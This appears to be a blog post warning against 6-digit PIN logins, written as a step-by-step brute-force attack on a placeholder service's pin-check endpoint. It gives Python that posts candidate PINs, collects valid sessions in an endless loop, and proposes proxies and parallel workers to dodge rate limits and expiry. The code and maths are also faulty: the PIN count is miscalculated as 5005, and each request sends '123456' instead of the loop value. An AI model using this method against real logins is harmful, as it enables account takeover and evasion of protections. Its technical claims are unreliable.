---
layout: post
title:  Why pin login is bad?
description: Accessing information using just pin login is dangerous and should be avoided at all costs.
date:   2022-01-04 14:04:00 +0500
categories: pin-login password security hacking
---

Accessing information using just pin login is dangerous and should be avoided at all costs.

# What is pin login ?

A pin login is a terminology used by people to provision access to data or an interface using a pin when they don't remember the password or when someone want to get access to account quickly using n digit pin.

# Use case

Recently i discovered one of the services that i was using used a pin login that will allow its customers to login to their account using a 6 digit pin.

Lets call the service xyz.com and the pin login page was available at https://xyz.com/account/pin-login

By entering the generated pin login behind the scenes the interface will allow a user to login to their account.

# Attach strategy

Firstly i need to figure out the valid pin login that i can use to access a user account randomly and save the session for me to access anytime i want. Once i am able to login to the account i can re use the session from a successful attack to access it again when ever i want.

It's a 6 digit pin login hence the combinations for this could be calculated using below formula

![image](https://user-images.githubusercontent.com/21299746/148114971-aefb43f5-724a-4373-bc50-20fd8ad00965.png)

n = 10 since we clearly know that it's a numerical combinations so the allowed total objects were 0-9

r = 6 the length of the pin

With this i can generate 5005 pins that could be tried that have repetitions i.e, a digit could be repeated one or more times.

I can generate the combinations with repetitions using python math module as below

```python
>>> from itertools import combinations_with_replacement
>>> n = range(10)
>>> r = 6
>>> values = list(combinations_with_replacement(n, r))
>>> possible_pins = ["".join(map(lambda x: str(x), item)) for item in values]
>>> possible_pins

['000000', '000001', '000002', '000003', '000004', '000005', '000006', '000007', '000008', '000009', '000011', '000012', '000013', '000014', '000015', '000016', '000017', '000018', '000019', '000022', '000023', '000024', '000025', '000026', '000027', '000028', '000029', '000033', '000034',...'899999', '999999']

```

# Attack

Since attempting to use pins in a browser with user interface is a memory intense operation i want to use something light and fast because we don't know yet how long these pins will be active/expire.

I made a network trace when i hit submit button using a random 6 digit pin and saw that the UI was making a post request to an endpoint https://xyz.com/account/pin-check

I can now use this network call to make a request using python requests module as below

```python
>>> import requests
>>> session = requests.Session()
>>> response = session.post("https://xyz.com/account/pin-check", json={"pin": "123456"})
>>> response

<Response [401]>

```

Now i will go ahead and try to use all the pins that i have to see if any pin is active and i can use it. I modified the above code to match my needs

```python
>>> successful_attacks = {}
>>> for pin in possible_pins:
>>>     session = requests.Session()
>>>     response = session.post("https://xyz.com/account/pin-check", json={"pin": "123456"})
>>>     if response.status_code == requests.codes.ok:
>>>         successful_attacks[pin] = session

```

The above code will find an active/valid pin during the time of request. I want to launch this attach throughout the day 24x7 so that if any one who generates the pin anytime i can get the session.

I will just put a while loop to do so.

```python
>>> def attack() -> dict:
>>>     successful_attacks = {}
>>>     for pin in possible_pins:
>>>         session = requests.Session()
>>>         response = session.post("https://xyz.com/account/pin-check", json={"pin": "123456"})
>>>         if response.status_code == requests.codes.ok:
>>>             successful_attacks[pin] = session
>>>     return successful_attacks
>>> successful_sessions = []
>>> while True:
>>>     successful_sessions += attack().values()

```

Once the above code runs forever i will get all the successful sessions that i can use to get access to the accounts.

# Problems that we have to address along the way

### Too many requests from the same ip address can result in blocked network calls

To resolve this we can use proxy ip addresses to make anonymized network calls using requests

### Time consumed for each attack with series of requests one after another

Now this is a good problem that i want to solve. If each request will take n seconds on an average, then it will take n * 5005 seconds for each attack. There is a possibility that a pin was created and expired during this time. So we have to be fast. To resolve this we can use multi processing or distributed task processing to distribute 5005 tasks evenly so that the results were generated instantly without having to wait on others.

# Conclusion

Pin logins are dangerous. Avoid completely if possible otherwise at least make it very complex so that the combinations are at higher level. You can achieve that by allowing characters, digits, special characters as a part of your pin with a long lengths. Set the pin expiry as small as possible so that a pin could be alive for only a very small time.
